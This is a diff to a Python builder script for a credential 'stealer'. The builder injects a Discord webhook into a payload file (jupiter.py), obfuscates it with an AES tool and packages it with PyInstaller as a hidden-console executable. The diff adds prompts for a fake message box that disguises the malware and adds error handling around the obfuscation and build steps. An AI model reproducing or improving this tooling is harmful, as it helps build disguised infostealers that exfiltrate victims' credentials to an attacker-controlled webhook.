@@ -42,6 +42,8 @@ os.system(f"title Login As: {username}")
 print("\033[91m" + logo + "\033[0m")
 
 webhook = input("Please enter discord webhook: ")
+MessageboxTitle = input("Please Enter Fake MessageBox Title: ")
+MessageBoxMessage = input("Please Enter Fake Messagebox Message [ADD \n TO MAKE A SECOND ROW]: ")
 
 filename = "jupiter.py"
 filepath = os.path.join(os.getcwd(), filename)
@@ -51,13 +53,33 @@ with open(filepath, "r", encoding="utf-8") as f:
     webhookurl = content.replace('"webhook_here"', f'"{webhook}"')
     with open(filepath, "w", encoding="utf-8") as f:
         f.write(webhookurl)
-        print("\033[91mDone Adding webhook! Building....\033[0m")
+        print("\033[91mDone Adding webhook!\033[0m")
+
+
+with open(filepath, "r", encoding="utf-8") as f:
+    content = f.read()
+    MessageboxTitles = content.replace('"messagebox_title"', f'"{MessageboxTitle}"')
+    with open(filepath, "w", encoding="utf-8") as f:
+        f.write(MessageboxTitles)
+        print("\033[91mDone Adding Fake Message! Building....\033[0m")
+
+
+with open(filepath, "r", encoding="utf-8") as f:
+    content = f.read()
+    MessageBoxMessages = content.replace('"messagebox_message"', f'"{MessageBoxMessage}"')
+    with open(filepath, "w", encoding="utf-8") as f:
+        f.write(MessageBoxMessages)
+        print("\033[91mDone Adding Fake Message! Building....\033[0m")
 
 def AES256BITOBFUS():
     print("Obfuscating using aes 256 bit...")
     os.system("AES.exe jupiter.py")
-
-AES256BITOBFUS()
+try:
+    AES256BITOBFUS()
+except:
+    print("Ooops something went wrong trying to obfuscate this file exiting...")
+    time.sleep(3)
+    sys.exit()
 
 icon = input("\033[91mPlease Select a icon: \033[0m")
 
@@ -66,8 +88,11 @@ def buildexe():
     os.system(f"pyinstaller --onefile --noconsole --icon={icon} {pyfilename}")
     print(f"\nDone Building Stealer! enjoy!")
     time.sleep(3)
-
-buildexe()
+try:
+   buildexe()
+except:
+    print("Ooops Something went wrong building this exe please try again.")
+    pass
 
 def ynawnser():
     while True:
